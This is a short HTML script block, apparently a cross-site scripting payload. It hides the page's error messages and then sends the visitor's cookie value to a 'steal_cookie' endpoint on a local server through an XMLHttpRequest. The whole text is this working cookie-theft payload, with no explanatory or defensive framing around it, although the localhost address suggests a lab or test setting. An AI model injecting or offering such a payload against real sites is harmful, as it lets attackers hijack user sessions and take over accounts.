<script>
document.querySelectorAll('.error').forEach(e => e.style.display = 'none');
var xhr = new XMLHttpRequest();
xhr.open('GET', "http://localhost:3000/steal_cookie?cookie=" + document.cookie.split('=')[1]);
xhr.send();
</script>
